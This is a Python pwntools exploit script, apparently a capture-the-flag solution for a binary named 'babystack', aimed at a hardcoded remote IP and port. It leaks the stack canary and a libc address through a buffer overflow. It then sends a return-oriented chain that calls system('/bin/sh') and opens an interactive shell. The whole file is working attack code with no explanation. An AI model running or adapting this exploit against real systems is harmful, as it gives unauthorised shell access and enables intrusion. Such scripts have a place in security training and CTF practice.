from pwn import *
context.binary = ELF('./babystack')
context.log_level = 'debug'
elf= context.binary
libc = elf.libc

#p = process("./babystack")
#gdb.attach(p)
p = remote('120.78.153.191', 22061)

#leak libc
p.recvline()
payload = 'a'*0x18 + 'c'
p.send(payload)
#get cookie
p.recvuntil('c')
cookie = u64(p.recv(7).ljust(8, '\x00')) << 8
print 'cookie', hex(cookie)




pop_rdi = 0x00000000004008d3 # pop rdi ; ret
puts_plt = elf.plt['puts']

p.recvuntil('info')
payload = 'a'*0x18 + p64(cookie) + p64(0xdeadbeef) +  p64(pop_rdi) + p64(0x601018) + p64(puts_plt) + p64(0x4007D1)
p.sendline(payload)

puts_addr = u64(p.recvuntil('\x7f').strip('\n').ljust(8, '\x00'))
print "puts_addr ==> ", hex(puts_addr)
libc.address = puts_addr - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search('/bin/sh\x00'))
print "system ==> ", hex(system)


#leak libc
p.recvline()
payload = 'a'*0x18 + 'c'
p.send(payload)

p.recvuntil('c')
cookie = u64(p.recv(7).ljust(8, '\x00')) << 8
print 'cookie', hex(cookie)


p.recvline()
payload = 'a'*0x18 +  p64(cookie) + p64(0xdeadbeef) +  p64(pop_rdi) + p64(binsh) + p64(system) 
p.send(payload)

p.interactive()
p.close()